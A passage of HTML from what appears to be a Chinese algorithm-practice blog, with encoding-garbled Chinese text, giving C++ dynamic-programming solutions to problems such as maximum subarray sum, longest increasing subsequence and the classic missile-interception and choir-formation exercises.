class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line">d[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> ans = a[<span class="number">0</span>], l = a[<span class="number">0</span>], r = a[<span class="number">0</span>], l_ = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(d[i<span class="number">-1</span>]+a[i] &lt; a[i])&#123;</span><br><span class="line">d[i] = a[i];</span><br><span class="line">l_ = a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">d[i] = d[i<span class="number">-1</span>] + a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ans &lt; d[i])&#123;</span><br><span class="line">ans = d[i];</span><br><span class="line">r = a[i];</span><br><span class="line">l = l_;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ans &lt; <span class="number">0</span>)&#123;</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line">l = a[<span class="number">0</span>];</span><br><span class="line">r = a[n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, ans, l, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æœ€å¤§å­ä¸²å’Œ"><a href="#æœ€å¤§å­ä¸²å’Œ" class="headerlink" title="æœ€å¤§å­ä¸²å’Œ"></a>æœ€å¤§å­ä¸²å’Œ</h3><h5 id="é¢˜ç›®æè¿°-41"><a href="#é¢˜ç›®æè¿°-41" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>è¾“å…¥nä¸ªæ•´æ•°çš„åºåˆ—ï¼Œæ±‚å®ƒçš„æœ€å¤§å­ä¸²å’Œï¼Œå¹¶è¾“å‡ºå¯¹åº”çš„æ•°ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-39"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-39" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-41"><a href="#è¾“å…¥æè¿°-41" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¤šç»„æµ‹è¯•æ•°æ®ã€‚</span><br><span class="line">ç¬¬ä¸€è¡Œè¾“å…¥ä¸€ä¸ªæ•´æ•°<span class="built_in">n</span>ï¼ˆ<span class="number">0</span>&lt;<span class="built_in">n</span>&lt;=<span class="number">100</span>ï¼‰ã€‚</span><br><span class="line">æ¥ä¸‹æ¥ä¸€è¡Œè¾“å…¥<span class="built_in">n</span>ä¸ªæ•°ç”¨ç©ºæ ¼éš”å¼€ï¼Œä¿è¯æ¯ä¸ªæ•°çš„ç»å¯¹å€¼å°äº<span class="number">1000</span>ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-41"><a href="#è¾“å‡ºæè¿°-41" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€è¡Œè¾“å‡ºæ‰€æ±‚å­ä¸²çš„åºåˆ—ï¼Œå¦‚æœæœ‰å¤šä¸ªç­”æ¡ˆï¼Œè¾“å‡ºé å‰çš„ç­”æ¡ˆã€‚</span><br><span class="line">ç¬¬äºŒè¡Œè¾“å‡ºæœ€å¤§å­ä¸²å’Œã€‚</span><br></pre></td></tr></table></figure><p>æˆ‘æ˜¯çœŸæœäº†ï¼Œä¸Šä¸€é¢˜çš„åˆè¿‡ä¸äº†ã€‚</p><p>ä½†è¿™ä¸€é¢˜è§„æ¨¡æ¯”è¾ƒå°ï¼Œå¯ä»¥çˆ†ç ´ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">int</span> a[n+<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;, d[n+<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> max = <span class="number">-1e7</span>, l=<span class="number">0</span>, r=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">d[i] = d[i<span class="number">-1</span>] + a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; i+j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(d[i+j] - d[i<span class="number">-1</span>] &gt; max)&#123;</span><br><span class="line">max = d[i+j] - d[i<span class="number">-1</span>];</span><br><span class="line">l = i;</span><br><span class="line">r = i+j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = l; i &lt;= r; i++)&#123;</span><br><span class="line">cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æœ€é•¿å‡åºå­åºåˆ—"><a href="#æœ€é•¿å‡åºå­åºåˆ—" class="headerlink" title="æœ€é•¿å‡åºå­åºåˆ—"></a>æœ€é•¿å‡åºå­åºåˆ—</h2><p>ä¸€ç§n^2çš„åšæ³•ï¼ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹ä¸º<img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193604186.png" alt="image-20230702193604186"><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193713438.png" alt="image-20230702193713438"></p><p>è¿˜æœ‰ä¸€ç§åŸºäºäºŒåˆ†å’Œè´ªå¿ƒçš„ç®—æ³•ï¼Œä¸ºO(nlogn)</p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193732252.png" alt="image-20230702193732252"></p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193722637.png" alt="image-20230702193722637"></p><h3 id="æœ€å¤§ä¸Šå‡å­åºåˆ—å’Œ"><a href="#æœ€å¤§ä¸Šå‡å­åºåˆ—å’Œ" class="headerlink" title="æœ€å¤§ä¸Šå‡å­åºåˆ—å’Œ"></a>æœ€å¤§ä¸Šå‡å­åºåˆ—å’Œ</h3><h5 id="é¢˜ç›®æè¿°-42"><a href="#é¢˜ç›®æè¿°-42" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>ä¸€ä¸ªæ•°çš„åºåˆ—biï¼Œå½“b1 &lt; b2 &lt; â€¦ &lt; bSçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªåºåˆ—æ˜¯ä¸Šå‡çš„ã€‚å¯¹äºç»™å®šçš„ä¸€ä¸ªåºåˆ—(a1, a2, â€¦,aN)ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€äº›ä¸Šå‡çš„å­åºåˆ—(ai1, ai2, â€¦, aiK)ï¼Œè¿™é‡Œ1 &lt;= i1 &lt; i2 &lt; â€¦ &lt; iK &lt;= Nã€‚æ¯”å¦‚ï¼Œå¯¹äºåºåˆ—(1, 7, 3, 5, 9, 4, 8)ï¼Œæœ‰å®ƒçš„ä¸€äº›ä¸Šå‡å­åºåˆ—ï¼Œå¦‚(1, 7), (3, 4, 8)ç­‰ç­‰ã€‚è¿™äº›å­åºåˆ—ä¸­åºåˆ—å’Œæœ€å¤§ä¸º18ï¼Œä¸ºå­åºåˆ—(1, 3, 5, 9)çš„å’Œ. ä½ çš„ä»»åŠ¡ï¼Œå°±æ˜¯å¯¹äºç»™å®šçš„åºåˆ—ï¼Œæ±‚å‡ºæœ€å¤§ä¸Šå‡å­åºåˆ—å’Œã€‚æ³¨æ„ï¼Œæœ€é•¿çš„ä¸Šå‡å­åºåˆ—çš„å’Œä¸ä¸€å®šæ˜¯æœ€å¤§çš„ï¼Œæ¯”å¦‚åºåˆ—(100, 1, 2, 3)çš„æœ€å¤§ä¸Šå‡å­åºåˆ—å’Œä¸º100ï¼Œè€Œæœ€é•¿ä¸Šå‡å­åºåˆ—ä¸º(1, 2, 3)ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-40"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-40" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-42"><a href="#è¾“å…¥æè¿°-42" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚</span><br><span class="line">æ¯ç»„æµ‹è¯•æ•°æ®ç”±ä¸¤è¡Œç»„æˆã€‚ç¬¬ä¸€è¡Œæ˜¯åºåˆ—çš„é•¿åº¦<span class="built_in">N</span> (<span class="number">1</span> &lt;= <span class="built_in">N</span> &lt;= <span class="number">1000</span>)ã€‚ç¬¬äºŒè¡Œç»™å‡ºåºåˆ—ä¸­çš„<span class="built_in">N</span>ä¸ªæ•´æ•°ï¼Œè¿™äº›æ•´æ•°çš„å–å€¼èŒƒå›´éƒ½åœ¨<span class="number">0</span>åˆ°<span class="number">10000</span>ï¼ˆå¯èƒ½é‡å¤ï¼‰ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-42"><a href="#è¾“å‡ºæè¿°-42" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹äºæ¯ç»„æµ‹è¯•æ•°æ®ï¼Œè¾“å‡ºå…¶æœ€å¤§ä¸Šå‡å­åºåˆ—å’Œã€‚</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é¢˜æ˜¯æœ€å¤§ä¸Šå‡å­åºåˆ—å’Œï¼Œè€Œä¸æ˜¯æœ€é•¿ä¸Šå‡å­åºåˆ—ï¼Œç›´æ¥dpéå†äº†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LIS</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">d[i] = a[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &lt; a[i])&#123;</span><br><span class="line">d[i] = <span class="built_in">max</span>(d[i], d[j] + a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="built_in">max</span>(d[i], ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="built_in">LIS</span>(n) &lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ‹¦æˆªå¯¼å¼¹"><a href="#æ‹¦æˆªå¯¼å¼¹" class="headerlink" title="æ‹¦æˆªå¯¼å¼¹"></a>æ‹¦æˆªå¯¼å¼¹</h3><h5 id="é¢˜ç›®æè¿°-43"><a href="#é¢˜ç›®æè¿°-43" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æŸå›½ä¸ºäº†é˜²å¾¡æ•Œå›½çš„å¯¼å¼¹è¢­å‡»ï¼Œå¼€å‘å‡ºä¸€ç§å¯¼å¼¹æ‹¦æˆªç³»ç»Ÿã€‚ä½†æ˜¯è¿™ç§å¯¼å¼¹æ‹¦æˆªç³»ç»Ÿæœ‰ä¸€ä¸ªç¼ºé™·ï¼šè™½ç„¶å®ƒçš„ç¬¬ä¸€å‘ç‚®å¼¹èƒ½å¤Ÿåˆ°è¾¾ä»»æ„çš„é«˜åº¦ï¼Œä½†æ˜¯ä»¥åæ¯ä¸€å‘ç‚®å¼¹éƒ½ä¸èƒ½é«˜äºå‰ä¸€å‘çš„é«˜åº¦ã€‚æŸå¤©ï¼Œé›·è¾¾æ•æ‰åˆ°æ•Œå›½çš„å¯¼å¼¹æ¥è¢­ï¼Œå¹¶è§‚æµ‹åˆ°å¯¼å¼¹ä¾æ¬¡é£æ¥çš„é«˜åº¦ï¼Œè¯·è®¡ç®—è¿™å¥—ç³»ç»Ÿæœ€å¤šèƒ½æ‹¦æˆªå¤šå°‘å¯¼å¼¹ã€‚æ‹¦æˆªæ¥è¢­å¯¼å¼¹æ—¶ï¼Œå¿…é¡»æŒ‰æ¥è¢­å¯¼å¼¹è¢­å‡»çš„æ—¶é—´é¡ºåºï¼Œä¸å…è®¸å…ˆæ‹¦æˆªåé¢çš„å¯¼å¼¹ï¼Œå†æ‹¦æˆªå‰é¢çš„å¯¼å¼¹ã€‚ </p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-41"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-41" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-43"><a href="#è¾“å…¥æè¿°-43" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">æ¯ç»„è¾“å…¥æœ‰ä¸¤è¡Œï¼Œ</span></span><br><span class="line"><span class="attr">ç¬¬ä¸€è¡Œï¼Œè¾“å…¥é›·è¾¾æ•æ‰åˆ°çš„æ•Œå›½å¯¼å¼¹çš„æ•°é‡kï¼ˆk&lt;</span>=<span class="string">25ï¼‰ï¼Œ</span></span><br><span class="line"><span class="string">ç¬¬äºŒè¡Œï¼Œè¾“å…¥kä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºkæšå¯¼å¼¹çš„é«˜åº¦ï¼ŒæŒ‰æ¥è¢­å¯¼å¼¹çš„è¢­å‡»æ—¶é—´é¡ºåºç»™å‡ºï¼Œä»¥ç©ºæ ¼åˆ†éš”ã€‚</span></span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-43"><a href="#è¾“å‡ºæè¿°-43" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯ç»„è¾“å‡ºåªæœ‰ä¸€è¡Œï¼ŒåŒ…å«ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤šèƒ½æ‹¦æˆªå¤šå°‘æšå¯¼å¼¹ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LIS</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">d[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt;= a[i])&#123;</span><br><span class="line">d[i] = <span class="built_in">max</span>(d[i], d[j] + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="built_in">max</span>(d[i], ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="built_in">LIS</span>(n) &lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆå”±é˜Ÿå½¢"><a href="#åˆå”±é˜Ÿå½¢" class="headerlink" title="åˆå”±é˜Ÿå½¢"></a>åˆå”±é˜Ÿå½¢</h3><h5 id="é¢˜ç›®æè¿°-44"><a href="#é¢˜ç›®æè¿°-44" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>Nä½åŒå­¦ç«™æˆä¸€æ’ï¼ŒéŸ³ä¹è€å¸ˆè¦è¯·å…¶ä¸­çš„(N-K)ä½åŒå­¦å‡ºåˆ—ï¼Œä½¿å¾—å‰©ä¸‹çš„Kä½åŒå­¦ä¸äº¤æ¢ä½ç½®å°±èƒ½æ’æˆåˆå”±é˜Ÿå½¢ã€‚ åˆå”±é˜Ÿå½¢æ˜¯æŒ‡è¿™æ ·çš„ä¸€ç§é˜Ÿå½¢ï¼šè®¾Kä½åŒå­¦ä»å·¦åˆ°å³ä¾æ¬¡ç¼–å·ä¸º1, 2, â€¦, Kï¼Œä»–ä»¬çš„èº«é«˜åˆ†åˆ«ä¸ºT1, T2, â€¦, TKï¼Œ åˆ™ä»–ä»¬çš„èº«é«˜æ»¡è¶³T1 &lt; T2 &lt; â€¦ &lt; Ti , Ti &gt; Ti+1 &gt; â€¦ &gt; TK (1 &lt;= i &lt;= K)ã€‚ ä½ çš„ä»»åŠ¡æ˜¯ï¼Œå·²çŸ¥æ‰€æœ‰Nä½åŒå­¦çš„èº«é«˜ï¼Œè®¡ç®—æœ€å°‘éœ€è¦å‡ ä½åŒå­¦å‡ºåˆ—ï¼Œå¯ä»¥ä½¿å¾—å‰©ä¸‹çš„åŒå­¦æ’æˆåˆå”±é˜Ÿå½¢ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-42"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-42" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-44"><a href="#è¾“å…¥æè¿°-44" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°<span class="built_in">N</span>ï¼ˆ<span class="number">2</span> &lt;= <span class="built_in">N</span> &lt;= <span class="number">100</span>ï¼‰ï¼Œè¡¨ç¤ºåŒå­¦çš„æ€»æ•°ã€‚</span><br><span class="line">ç¬¬ä¸€è¡Œæœ‰<span class="built_in">n</span>ä¸ªæ•´æ•°ï¼Œç”¨ç©ºæ ¼åˆ†éš”ï¼Œç¬¬iä¸ªæ•´æ•°Tiï¼ˆ<span class="number">130</span> &lt;= Ti &lt;= <span class="number">230</span>ï¼‰æ˜¯ç¬¬iä½åŒå­¦çš„èº«é«˜ï¼ˆå˜ç±³ï¼‰ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-44"><a href="#è¾“å‡ºæè¿°-44" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¯èƒ½åŒ…æ‹¬å¤šç»„æµ‹è¯•æ•°æ®ï¼Œå¯¹äºæ¯ç»„æ•°æ®ï¼Œ</span><br><span class="line">è¾“å‡ºåŒ…æ‹¬ä¸€è¡Œï¼Œè¿™ä¸€è¡ŒåªåŒ…å«ä¸€ä¸ªæ•´æ•°ï¼Œå°±æ˜¯æœ€å°‘éœ€è¦å‡ ä½åŒå­¦å‡ºåˆ—ã€‚</span><br></pre></td></tr></table></figure><p>æ­£ç€æ’ä¸€éï¼Œå†å€’ç€æ’ä¸€éï¼Œæ‰¾æœ€å¤§çš„</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span 